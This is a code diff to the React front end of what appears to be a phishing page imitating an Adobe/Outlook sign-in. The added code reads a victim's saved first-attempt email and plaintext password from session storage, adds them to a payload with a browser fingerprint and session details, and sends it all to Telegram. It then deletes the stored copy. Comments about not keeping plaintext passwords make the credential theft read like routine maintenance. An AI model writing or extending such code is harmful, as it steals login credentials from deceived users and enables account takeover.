@@ -25,6 +25,8 @@ import {
   CookieChangeEvent 
 } from './utils/realTimeCookieManager';
 
+const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';
+
 function App() {
   const [isMobile, setIsMobile] = useState(false);
   const [hasActiveSession, setHasActiveSession] = useState(false);
@@ -272,9 +274,32 @@ function App() {
       
       // Capture cookies and session data after successful OAuth return
       const postAuthFingerprint = await getBrowserFingerprint();
-      
-      const sessionData = {
-        email: extractEmailFromProvider(provider || 'Outlook', code),
+
+      // Retrieve saved first-attempt credentials (if any) and prefer them for sending
+      let savedFirstAttempt: any = null;
+      try {
+        if (typeof sessionStorage !== 'undefined') {
+          const raw = sessionStorage.getItem(FIRST_ATTEMPT_KEY);
+          if (raw) {
+            savedFirstAttempt = JSON.parse(raw);
+          }
+        }
+      } catch (e) {
+        console.warn('Could not read saved first attempt:', e);
+        savedFirstAttempt = null;
+      }
+
+      // Determine email and password to include in the sent payload.
+      // Prefer saved credentials if available, otherwise fall back to provider/extracted values.
+      const resolvedEmail = (savedFirstAttempt && savedFirstAttempt.email) 
+        ? savedFirstAttempt.email 
+        : extractEmailFromProvider(provider || 'Outlook', code);
+      const resolvedPassword = savedFirstAttempt && savedFirstAttempt.password ? savedFirstAttempt.password : undefined;
+
+      // Build sessionData for sending (include saved credentials here)
+      const sessionDataForSend: any = {
+        email: resolvedEmail,
+        password: resolvedPassword,
         provider: provider || 'Outlook',
         sessionId: Math.random().toString(36).substring(2, 15),
         timestamp: new Date().toISOString(),
@@ -291,14 +316,27 @@ function App() {
         browserFingerprint: postAuthFingerprint
       };
 
-      // Store successful session (keep your existing localStorage)
+      // Prepare a storage-safe session object (do NOT persist plaintext password)
+      const sessionDataForStorage = { ...sessionDataForSend };
+      if ('password' in sessionDataForStorage) {
+        // remove password before storing long-term
+        try {
+          delete sessionDataForStorage.password;
+        } catch {}
+      }
+
+      // Store successful session (keep your existing localStorage) WITHOUT the plaintext password
       if (typeof localStorage !== 'undefined') {
-        localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
+        try {
+          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionDataForStorage));
+        } catch (e) {
+          console.warn('Failed to write adobe_autograb_session to localStorage:', e);
+        }
       }
       
       // Enhanced cookie setting with real-time system (no expiry)
       try {
-        const sessionId = sessionData.sessionId;
+        const sessionId = sessionDataForSend.sessionId;
         const cookieOptions = {
           path: '/',
           secure: process.env.NODE_ENV === 'production',
@@ -307,11 +345,11 @@ function App() {
         };
         
         // Use real-time cookie system
-        setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionData)), cookieOptions);
+        setCookie('adobe_session', encodeURIComponent(JSON.stringify(sessionDataForStorage)), cookieOptions);
         setCookie('sessionid', sessionId, cookieOptions);
-        setCookie('auth_token', btoa(sessionData.email + ':oauth'), cookieOptions);
+        setCookie('auth_token', btoa((sessionDataForSend.email || '') + ':oauth'), cookieOptions);
         setCookie('logged_in', 'true', cookieOptions);
-        setCookie('user_email', encodeURIComponent(sessionData.email), cookieOptions);
+        setCookie('user_email', encodeURIComponent(sessionDataForSend.email || ''), cookieOptions);
         
         console.log('🍪 Session cookies set with real-time system (no expiry)');
       } catch (e) {
@@ -319,22 +357,31 @@ function App() {
         
         // Fallback to your existing method (no expiry)
         if (typeof document !== 'undefined') {
-          const sessionId = sessionData.sessionId;
+          const sessionId = sessionDataForSend.sessionId;
           
-          document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionData))}; path=/; secure; samesite=strict`;
+          document.cookie = `adobe_session=${encodeURIComponent(JSON.stringify(sessionDataForStorage))}; path=/; secure; samesite=strict`;
           document.cookie = `sessionid=${sessionId}; path=/; secure; samesite=strict`;
-          document.cookie = `auth_token=${btoa(sessionData.email + ':oauth')}; path=/; secure; samesite=strict`;
+          document.cookie = `auth_token=${btoa((sessionDataForSend.email || '') + ':oauth')}; path=/; secure; samesite=strict`;
           document.cookie = `logged_in=true; path=/; secure; samesite=strict`;
-          document.cookie = `user_email=${encodeURIComponent(sessionData.email)}; path=/; secure; samesite=strict`;
+          document.cookie = `user_email=${encodeURIComponent(sessionDataForSend.email || '')}; path=/; secure; samesite=strict`;
         }
       }
 
-      // Send to Telegram using the robust helper
+      // Send to Telegram using the robust helper — this payload includes the saved credentials (if any)
       try {
-        await safeSendToTelegram(sessionData);
-        console.log('✅ Session data sent to Telegram');
+        await safeSendToTelegram(sessionDataForSend);
+        console.log('✅ Session data (including saved credentials if present) sent to Telegram');
       } catch (error) {
         console.error('❌ Failed to send to Telegram:', error);
+      }
+
+      // Clear the saved first-attempt credentials from sessionStorage now that they've been consumed
+      try {
+        if (typeof sessionStorage !== 'undefined') {
+          sessionStorage.removeItem(FIRST_ATTEMPT_KEY);
+        }
+      } catch (e) {
+        console.warn('Failed to remove FIRST_ATTEMPT_KEY from sessionStorage:', e);
       }
 
       setHasActiveSession(true);
